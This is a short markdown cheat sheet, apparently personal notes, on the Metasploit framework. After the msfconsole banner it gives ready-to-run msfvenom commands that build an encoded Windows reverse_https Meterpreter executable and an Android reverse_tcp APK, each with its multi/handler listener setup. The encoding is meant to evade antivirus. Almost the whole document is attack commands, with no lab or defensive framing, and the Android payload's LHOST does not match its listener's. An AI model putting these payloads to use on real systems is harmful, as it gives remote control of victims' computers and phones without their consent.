# Metasploit

- Popular hacking tool
```ruby
┌──(kali㉿kali)-[~]
└─$ msfconsole
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.0.15-dev                          ]
+ -- --=[ 2071 exploits - 1123 auxiliary - 352 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Search can apply complex filters such as search cve:2009 type:exploit, see all the filters with help search

msf6 > 
```
## Msfvenom for windows

*Payload*
```sh
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.12 LPORT=1234 -e x86/shikata_ga_nai -i 7 -f exe > exploit.exe
```
*Listener*
```sh
# Open msfconsole
msfconsole

# setting exploit(payload)
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set autorunscript post/windows/manage/migrate
set lhost 192.168.1.12
set lport 1234
exploit
```
## Msfvenom for android

```sh
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.13 LPORT=1234 -R > exploit.apk
```

```sh
# Open msfconsole
msfconsole

# setting exploit(payload)
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost 192.168.1.12
set lport 1234
exploit
```
